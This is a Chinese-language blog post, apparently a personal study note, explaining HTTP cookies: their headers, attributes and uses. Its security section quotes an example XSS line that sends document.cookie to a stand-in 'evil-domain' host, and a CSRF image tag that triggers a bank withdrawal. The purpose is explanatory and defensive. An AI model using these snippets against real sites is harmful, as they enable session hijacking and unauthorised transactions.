@@ -1,0 +1,171 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cookie | EsilyZhangNotes</title>
+<link rel="shortcut icon" href="https://SmallPotatoCZ.github.io/notes/favicon.ico?v=1561556020719">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://SmallPotatoCZ.github.io/notes/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/moment.js/2.23.0/moment.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://SmallPotatoCZ.github.io/notes">
+  <img class="avatar" src="https://SmallPotatoCZ.github.io/notes/images/avatar.png?v=1561556020719" alt="">
+  </a>
+  <h1 class="site-title">
+    EsilyZhangNotes
+  </h1>
+  <p class="site-description">
+    知识笔记
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+        <a href="https://twitter.com/SmallPotatoZC" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Cookie
+            </h2>
+            <div class="post-info">
+              <time class="post-time">
+                · 2019-06-26 ·
+              </time>
+              
+                <a href="https://SmallPotatoCZ.github.io/notes/tag/BsAatmTnE" class="post-tag">
+                  # Auth
+                </a>
+              
+            </div>
+            
+              <div class="post-feature-image" style="background-image: url('https://static.zhangchao.online/media/images/3x2/5c7ecafd-bf18-b8f5-08b2-f3e5d39170a3.jpg')">
+              </div>
+            
+            <div class="post-content">
+              <p>Cookie</p>
+<!-- more -->
+<h1 id="cookie">Cookie</h1>
+<h2 id="是谁">是谁</h2>
+<p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</p>
+<h2 id="从哪里来">从哪里来</h2>
+<p>当服务器收到 HTTP 请求时，服务器可以在相应头中添加一个<code>Set-Cookie</code>选项。浏览器收到响应头通常会保存下Cookie,之后对该服务每一次请求中都通过<code>Cookie</code>请求头部将 Cookie 信息发送至服务器。</p>
+<p>服务器设置<code>Cookie</code>：</p>
+<pre><code class="language-yaml">HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+</code></pre>
+<p>浏览器发送请求头部：</p>
+<pre><code class="language-yaml">GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+</code></pre>
+<h3 id="属性">属性</h3>
+<p>Cookie的属性：过期时间、有效期、Secure、HttpOnly、域、路径、适用站点。</p>
+<h4 id="过期时间">过期时间</h4>
+<p>不指定过期时间（Expires）或者有效期（Max-Age），通常浏览器关闭后，Cookie 会删除。</p>
+<p>指定一个特定的过期时间（Expires）或者有效期（Max-Age），关闭浏览器 Cookie 不会消失。</p>
+<blockquote>
+<p>Cookie 的过期时间或者有效期只和客户端有关。</p>
+</blockquote>
+<h4 id="secure">Secure</h4>
+<p>标记为<code>Secure</code>的Cookie只应通过HTTPS协议加密过的请求发送给服务端。</p>
+<h4 id="httponly">HttpOnly</h4>
+<p>HttpOnly 标记的 Cookie 不允许<code>Document.cookie</code>访问Cookie，只允许发送至服务端。</p>
+<h3 id="域">域</h3>
+<p><code>Domain</code>和<code>Path</code>标识了Cookie的作用域：Cookie应该发送给哪些URL。</p>
+<h2 id="到哪里去">到哪里去</h2>
+<ul>
+<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
+<li>个性化设置（如用户自定义设置、主题等）</li>
+<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
+</ul>
+<h2 id="评价">评价</h2>
+<p>由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 <a href="">Web storage API</a> （本地存储和会话存储）或 <a href="">IndexedDB</a> 。</p>
+<h3 id="安全问题">安全问题</h3>
+<h4 id="会话劫持和xss">会话劫持和XSS</h4>
+<pre><code class="language-js">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
+</code></pre>
+<h4 id="跨站请求伪造csrf">跨站请求伪造（CSRF）</h4>
+<pre><code class="language-js">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;
+</code></pre>
+<p>当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。</p>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP Cookie</a></li>
+</ol>
+
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/SmallPotatoCZ/notes" target="_blank">EsilyZhang</a> | 
+  <a class="rss" href="https://SmallPotatoCZ.github.io/notes/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
